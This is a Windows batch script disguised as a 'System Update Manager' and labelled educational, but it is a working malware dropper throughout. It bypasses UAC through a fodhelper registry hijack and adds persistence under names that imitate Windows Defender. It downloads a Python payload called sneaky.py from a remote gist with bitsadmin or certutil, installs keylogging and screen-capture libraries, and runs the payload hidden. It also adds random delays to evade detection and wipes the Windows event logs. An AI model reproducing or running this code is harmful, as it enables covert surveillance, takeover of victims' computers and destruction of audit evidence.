@echo off
setlocal EnableDelayedExpansion

:: Auto-Jug System Update Manager for Windows
:: Version 1.3
:: Author: Bigawn
:: Purpose: Remote administration tool for educational demonstration
:: Date: March 09, 2025

:: Detect architecture
set "ARCH=x64"
if "%PROCESSOR_ARCHITECTURE%"=="x86" if not defined PROCESSOR_ARCHITEW6432 set "ARCH=x86"

:: Define variables with legitimate names
set "DOWNLOAD_URL=https://gist.github.com/jonhardwick-spec/41455097cfe76beaf4464d8dbd0ab35b/raw"
set "TARGET_DIR=%APPDATA%\SystemUtilities"
set "TARGET_FILE=%TARGET_DIR%\sneaky.py"
set "TEMP_FILE=%TEMP%\temp_update.dat"
set "PYTHON_DIR=%APPDATA%\PythonRuntime"
set "PYTHON_PATH=%PYTHON_DIR%\python.exe"
set "DEBUG_LOG=%~dp0autojug_debug.log"
set "MAX_RETRY_ATTEMPTS=3"
set "RETRY_INTERVAL=5"
set "RANDOM_DELAY_MIN=5"
set "RANDOM_DELAY_MAX=30"
set "PYTHON_ZIP_URL=https://www.python.org/ftp/python/3.11.0/python-3.11.0-embed-!ARCH!.zip"

:: Clear previous debug log
if exist "%DEBUG_LOG%" del "%DEBUG_LOG%" >nul 2>&1

:: Log start of script with system info
echo [%DATE% %TIME%] Starting Auto-Jug System Update Manager on Windows >> "%DEBUG_LOG%"
echo [%DATE% %TIME%] Architecture: !ARCH! >> "%DEBUG_LOG%"
echo [%DATE% %TIME%] Script Directory: %~dp0 >> "%DEBUG_LOG%"
echo [%DATE% %TIME%] Current User: %USERNAME% >> "%DEBUG_LOG%"
echo [%DATE% %TIME%] System Info: %OS% >> "%DEBUG_LOG%"
echo [%DATE% %TIME%] PATH: %PATH% >> "%DEBUG_LOG%"

:: Create directory if it doesn't exist
if not exist "%TARGET_DIR%" (
    mkdir "%TARGET_DIR%" >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [%DATE% %TIME%] Failed to create directory: %TARGET_DIR% (Error: !ERRORLEVEL!) >> "%DEBUG_LOG%"
        exit /b 1
    )
    echo [%DATE% %TIME%] Created directory: %TARGET_DIR% >> "%DEBUG_LOG%"
) else (
    echo [%DATE% %TIME%] Directory already exists: %TARGET_DIR% >> "%DEBUG_LOG%"
)

:: Check for admin privileges
net session >nul 2>&1
set "IS_ADMIN=!ERRORLEVEL!"
if !IS_ADMIN! neq 0 (
    echo [%DATE% %TIME%] Non-admin detected, attempting elevation... >> "%DEBUG_LOG%"
    call :AttemptUACElevation
    net session >nul 2>&1
    if !ERRORLEVEL! equ 0 set "IS_ADMIN=0"
)

:: Configure persistence based on privileges
echo [%DATE% %TIME%] Configuring persistence... >> "%DEBUG_LOG%"
if !IS_ADMIN! equ 0 (
    schtasks /create /tn "WindowsDefenderHealthService" /tr "\"%PYTHON_PATH%\" \"%TARGET_FILE%\"" /sc ONSTART /ru SYSTEM /f >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [%DATE% %TIME%] WMI persistence failed (Error: !ERRORLEVEL!), using fallback... >> "%DEBUG_LOG%"
    ) else (
        echo [%DATE% %TIME%] WMI persistence configured >> "%DEBUG_LOG%"
    )
) else (
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsDefenderHealth /t REG_SZ /d "\"%PYTHON_PATH%\" \"%TARGET_FILE%\"" /f >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [%DATE% %TIME%] Registry persistence failed (Error: !ERRORLEVEL!), using startup folder... >> "%DEBUG_LOG%"
        set "STARTUP_DIR=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
        echo @echo off > "%STARTUP_DIR%\system_update_helper.bat"
        echo start /b "" "%PYTHON_PATH%" "%TARGET_FILE%" >> "%STARTUP_DIR%\system_update_helper.bat"
    ) else (
        echo [%DATE% %TIME%] Registry persistence configured >> "%DEBUG_LOG%"
    )
)

:: Check if Python is installed
echo [%DATE% %TIME%] Checking for Python... >> "%DEBUG_LOG%"
set "FOUND_PYTHON="
for %%i in (py python python3) do (
    where %%i >nul 2>&1 && (
        %%i -c "import sys; sys.exit(0)" >nul 2>&1
        if !ERRORLEVEL! equ 0 (
            set "FOUND_PYTHON=%%i"
            echo [%DATE% %TIME%] Found %%i in PATH >> "%DEBUG_LOG%"
            goto :CHECK_PYTHON
        )
    )
)
:CHECK_PYTHON
if defined FOUND_PYTHON (
    set "PYTHON_PATH=!FOUND_PYTHON!"
    echo import pynput > "%TEMP%\test_python.py"
    "!PYTHON_PATH!" "%TEMP%\test_python.py" >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [%DATE% %TIME%] Python test failed, proceeding with embedded download >> "%DEBUG_LOG%"
        set "FOUND_PYTHON="
    ) else (
        echo [%DATE% %TIME%] Python test successful, using existing Python >> "%DEBUG_LOG%"
    )
    del "%TEMP%\test_python.py" >nul 2>&1
)

:: If Python test failed or not found, download embedded Python
if not defined FOUND_PYTHON (
    echo [%DATE% %TIME%] Python not found or test failed, downloading embedded Python... >> "%DEBUG_LOG%"
    if not exist "%PYTHON_PATH%" (
        mkdir "%PYTHON_DIR%" >nul 2>&1
        if !ERRORLEVEL! neq 0 (
            echo [%DATE% %TIME%] Failed to create directory for Python: %PYTHON_DIR% (Error: !ERRORLEVEL!) >> "%DEBUG_LOG%"
            exit /b 1
        )
        echo [%DATE% %TIME%] Downloading embedded Python using BITSAdmin... >> "%DEBUG_LOG%"
        for /l %%i in (1,1,!MAX_RETRY_ATTEMPTS!) do (
            bitsadmin /transfer job /download /priority normal "!PYTHON_ZIP_URL!" "%TEMP%\python.zip" >nul 2>&1
            if !ERRORLEVEL! equ 0 goto :EXTRACT_PYTHON
            echo [%DATE% %TIME%] Retry %%i/%MAX_RETRY_ATTEMPTS% failed, waiting %RETRY_INTERVAL% seconds... >> "%DEBUG_LOG%"
            timeout /t !RETRY_INTERVAL! /nobreak >nul 2>&1
        )
        echo [%DATE% %TIME%] All retries failed for Python download, falling back to certutil... >> "%DEBUG_LOG%"
        certutil -urlfetch -split -f "!PYTHON_ZIP_URL!" "%TEMP%\python.zip" >nul 2>&1
        :EXTRACT_PYTHON
        if exist "%TEMP%\python.zip" (
            powershell -ExecutionPolicy Bypass -Command "Expand-Archive -Path '%TEMP%\python.zip' -DestinationPath '%PYTHON_DIR%' -Force" >nul 2>&1
            if !ERRORLEVEL! neq 0 (
                echo [%DATE% %TIME%] Failed to extract Python zip to %PYTHON_DIR% (Error: !ERRORLEVEL!) >> "%DEBUG_LOG%"
                exit /b 1
            )
            echo -._pth > "%PYTHON_DIR%\python311._pth"
            echo Lib\site-packages >> "%PYTHON_DIR%\python311._pth"
            timeout /t 2 /nobreak >nul 2>&1
            if not exist "%PYTHON_PATH%" (
                echo [%DATE% %TIME%] Python executable not found at %PYTHON_PATH% after extraction >> "%DEBUG_LOG%"
                exit /b 1
            )
            echo [%DATE% %TIME%] Embedded Python installed at %PYTHON_PATH% >> "%DEBUG_LOG%"
        ) else (
            echo [%DATE% %TIME%] Failed to download Python zip >> "%DEBUG_LOG%"
            exit /b 1
        )
        del "%TEMP%\python.zip" >nul 2>&1
    )
)

:: Download the script silently with random delay and retries
set /a "RANDOM_DELAY=!RANDOM_DELAY_MIN! + (!RANDOM_DELAY_MAX! - !RANDOM_DELAY_MIN!) * %RANDOM% / 32768"
echo [%DATE% %TIME%] Applying random delay of !RANDOM_DELAY! seconds... >> "%DEBUG_LOG%"
timeout /t !RANDOM_DELAY! /nobreak >nul 2>&1
echo [%DATE% %TIME%] Downloading sneaky.py from %DOWNLOAD_URL% using BITSAdmin... >> "%DEBUG_LOG%"
for /l %%i in (1,1,!MAX_RETRY_ATTEMPTS!) do (
    bitsadmin /transfer job /download /priority normal "%DOWNLOAD_URL%" "%TEMP_FILE%" >nul 2>&1
    if !ERRORLEVEL! equ 0 goto :MOVE_FILE
    echo [%DATE% %TIME%] Retry %%i/%MAX_RETRY_ATTEMPTS% failed, waiting %RETRY_INTERVAL% seconds... >> "%DEBUG_LOG%"
    timeout /t !RETRY_INTERVAL! /nobreak >nul 2>&1
)
echo [%DATE% %TIME%] BITSAdmin download failed, falling back to certutil... >> "%DEBUG_LOG%"
certutil -urlfetch -split -f "%DOWNLOAD_URL%" "%TEMP_FILE%" >nul 2>&1
:MOVE_FILE
if exist "%TEMP_FILE%" (
    move /Y "%TEMP_FILE%" "%TARGET_FILE%" >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [%DATE% %TIME%] Failed to move %TEMP_FILE% to %TARGET_FILE% (Error: !ERRORLEVEL!) >> "%DEBUG_LOG%"
        exit /b 1
    )
    echo [%DATE% %TIME%] Successfully downloaded sneaky.py to %TARGET_FILE% >> "%DEBUG_LOG%"
) else (
    echo [%DATE% %TIME%] Failed to download sneaky.py from %DOWNLOAD_URL% >> "%DEBUG_LOG%"
    exit /b 1
)

:: Install dependencies silently with random delay
set /a "RANDOM_DELAY=!RANDOM_DELAY_MIN! + (!RANDOM_DELAY_MAX! - !RANDOM_DELAY_MIN!) * %RANDOM% / 32768"
echo [%DATE% %TIME%] Applying random delay of !RANDOM_DELAY! seconds before dependency install... >> "%DEBUG_LOG%"
timeout /t !RANDOM_DELAY! /nobreak >nul 2>&1
echo [%DATE% %TIME%] Installing dependencies... >> "%DEBUG_LOG%"
"%PYTHON_PATH%" -m ensurepip --upgrade >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [%DATE% %TIME%] Failed to set up ensurepip (Error: !ERRORLEVEL!), retrying... >> "%DEBUG_LOG%"
    timeout /t !RETRY_INTERVAL! >nul 2>&1
    "%PYTHON_PATH%" -m ensurepip --upgrade >nul 2>&1
)
"%PYTHON_PATH%" -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 pywin32==306 >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [%DATE% %TIME%] Failed to install dependencies (Error: !ERRORLEVEL!), retrying... >> "%DEBUG_LOG%"
    timeout /t !RETRY_INTERVAL! >nul 2>&1
    "%PYTHON_PATH%" -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 pywin32==306 >nul 2>&1
)
echo [%DATE% %TIME%] Dependencies installed successfully >> "%DEBUG_LOG%"

:: Verify dependencies with random delay
set /a "RANDOM_DELAY=!RANDOM_DELAY_MIN! + (!RANDOM_DELAY_MAX! - !RANDOM_DELAY_MIN!) * %RANDOM% / 32768"
echo [%DATE% %TIME%] Applying random delay of !RANDOM_DELAY! seconds before dependency verification... >> "%DEBUG_LOG%"
timeout /t !RANDOM_DELAY! /nobreak >nul 2>&1
echo [%DATE% %TIME%] Verifying dependencies... >> "%DEBUG_LOG%"
echo import pynput; import PIL; import cv2; import Cryptodome; import psutil; import win32api > "%TEMP%\check_deps.py"
"%PYTHON_PATH%" "%TEMP%\check_deps.py" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [%DATE% %TIME%] Dependency verification failed (Error: !ERRORLEVEL!), retrying install... >> "%DEBUG_LOG%"
    "%PYTHON_PATH%" -m pip install --user --quiet pynput==1.7.6 Pillow==10.0.0 opencv-python==4.8.0.76 pycryptodome==3.19.0 psutil==5.9.5 pywin32==306 >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [%DATE% %TIME%] Retry failed for dependencies (Error: !ERRORLEVEL!) >> "%DEBUG_LOG%"
        exit /b 1
    )
    echo [%DATE% %TIME%] Dependencies installed on retry >> "%DEBUG_LOG%"
) else (
    echo [%DATE% %TIME%] Dependencies verified successfully >> "%DEBUG_LOG%"
)
del "%TEMP%\check_deps.py" >nul 2>&1

:: Run the script invisibly using wscript with random delay
set /a "RANDOM_DELAY=!RANDOM_DELAY_MIN! + (!RANDOM_DELAY_MAX! - !RANDOM_DELAY_MIN!) * %RANDOM% / 32768"
echo [%DATE% %TIME%] Applying random delay of !RANDOM_DELAY! seconds before execution... >> "%DEBUG_LOG%"
timeout /t !RANDOM_DELAY! /nobreak >nul 2>&1
echo [%DATE% %TIME%] Starting sneaky.py... >> "%DEBUG_LOG%"
echo CreateObject("WScript.Shell").Run """" & WScript.Arguments(0) & """", 0, False > "%TEMP%\run.vbs"
wscript "%TEMP%\run.vbs" "\"%PYTHON_PATH%\" \"%TARGET_FILE%\"" >nul 2>&1
if !ERRORLEVEL! neq 0 (
    echo [%DATE% %TIME%] Failed to start sneaky.py using wscript (Error: !ERRORLEVEL!) >> "%DEBUG_LOG%"
    start /b "" "%PYTHON_PATH%" "%TARGET_FILE%" >nul 2>&1
    if !ERRORLEVEL! neq 0 (
        echo [%DATE% %TIME%] Fallback failed to start sneaky.py directly (Error: !ERRORLEVEL!) >> "%DEBUG_LOG%"
        exit /b 1
    ) else (
        echo [%DATE% %TIME%] Fallback: sneaky.py started directly >> "%DEBUG_LOG%"
    )
) else (
    echo [%DATE% %TIME%] sneaky.py started successfully using wscript >> "%DEBUG_LOG%"
)
del "%TEMP%\run.vbs" >nul 2>&1

:: Hide the debug log file
attrib +h "%DEBUG_LOG%" >nul 2>&1

:: Clean traces
echo [%DATE% %TIME%] Cleaning traces... >> "%DEBUG_LOG%"
wevtutil cl System >nul 2>&1
wevtutil cl Security >nul 2>&1
wevtutil cl Application >nul 2>&1
for %%f in ("%TEMP%\*.dat") do if exist "%%f" del "%%f" >nul 2>&1

exit /b 0

:: Subroutine for UAC Elevation
:AttemptUACElevation
set "key=HKCU\Software\Classes\ms-settings\Shell\Open\command"
reg add "%key%" /v "" /t REG_SZ /d "cmd /c start %~f0" /f >nul 2>&1
reg add "%key%" /v "DelegateExecute" /t REG_SZ /d "" /f >nul 2>&1
start "" fodhelper.exe
timeout /t 2 /nobreak >nul 2>&1
reg delete "%key%" /f >nul 2>&1
exit /b